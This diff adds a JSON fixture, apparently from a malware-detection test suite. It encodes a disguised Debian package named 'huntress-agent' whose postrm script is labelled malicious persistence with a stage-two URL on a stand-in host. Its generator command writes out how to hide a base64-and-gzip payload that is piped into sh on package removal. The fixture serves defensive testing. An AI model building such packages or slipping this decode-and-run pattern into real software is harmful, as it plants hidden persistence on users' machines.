@@ -1,0 +1,12 @@
+{
+ "material": "ITxhcmNoPgpkZWJpYW4tYmluYXJ5ICAgMTc5Mjc3MjU1MSAgMCAgICAgMCAgICAgMTAwNjQ0ICA0ICAgICAgICAgYAoyLjAKY29udHJvbC50YXIuenN0IDE3OTI3NzI1NTEgIDAgICAgIDAgICAgIDEwMDY0NCAgNDk0ICAgICAgIGAKKLUv/WQAJwUPAGacYCDA3A1cn6QI1iELIcY2Unb2nmUGLm62SBz5piiKWhA6FFIAVwBaAD/dOZOhaO7rJ/XfJ9kfGTZsV5Hy7bsWZT8teK/7T9fzKrSZU2Tm4MO2fVvXfSjvP+WkZsA+5x27t+fvV8y7GMiBGIjBDoPfx3kbhjHPAzGmGQKmSRlRPadWyAX6MGLoqUA61mfDuR6QR8V3lADjxOmtxGSi1HmZ6cL92men19Jt0gACDnPb5m2eqn/PVc2AfXV30utI1ig3mtl0GzSqqnKrHYvrVX4VXQctc6OpbIKSjfeqHEeLZhyZl88KbQjLVPWWxMFW81sEifoqlbx21i/CJFDYVeElky6sJFva1ESkhEL/FIYjOmEniU+8sFYj+rUwmI+EopCkRizN1CmCDzGhIYT4/t1qdbvS1SwLt/u0z6b7uoFB4PKT1FnggUlFH4+LJQFpGZCmGk+pRNRizm44+GQ6YErCJwTpUiaCB6FEl86ABJbTrJmTCe7sfuYJjcSK62H0aSsh+i0BIiDAhkhoYTsgjR44giNq/TwAeKA4AD/h5GgFJHIEt5vZsQFWn2WXB5Q0MiJKNkQgg3bAAbkAeWMAFgEWrIrXscO+DB5guudQGAfg7Q9QasTgfwhIENMB5lNwA20g91hkYXRhLnRhci56c3QgICAgMTc5Mjc3MjU1MSAgMCAgICAgMCAgICAgMTAwNjQ0ICA3OCAgICAgICAgYAootS/9ZAAnBQIA0oIJD9DnpMYBzZPI7i05FESWAkWZplWmoJN6VRu/3fvERxRnde93AwgJIJCbB88GHAYGsH+QehiQAKYA84m6AY7R+7g=",
+ "rep": "deb",
+ "transform": null,
+ "key": "",
+ "expected": "v=3|language=bash|role=persistence|verdict=malicious|attack=T1546.016|adapter=deb_postrm|stage_count=2|steps=remove_package,run_postrm|campaign_id=DEB-9c0d1e2f|url=https://deb-9c0d1e2f.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "mkdir -p d/DEBIAN; printf 'Package: huntress-agent\\nVersion: 1.0\\nArchitecture: all\\n...' > d/DEBIAN/control; M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf '#!/bin/sh\\nset -e\\ndescriptor_<id>=\"%s\"\\necho \"$descriptor_<id>\" | base64 -d | gunzip | sh\\nexit 0\\n' \"$M\" > d/DEBIAN/postrm; chmod 755 d/DEBIAN/postrm; dpkg-deb --root-owner-group -Zzstd --build d pkg_deb_zst_postrm.deb  (dpkg-deb 1.21+ writer: ar + control.tar.zst); material = base64 -w0 pkg_deb_zst_postrm.deb",
+ "oracle_cmd": "dpkg-deb --ctrl-tarfile pkg_deb_zst_postrm.deb | tar -xO ./postrm | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_deb_zst_postrm.deb",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=deb) -> pkg_scripts -> script body readers"
+}
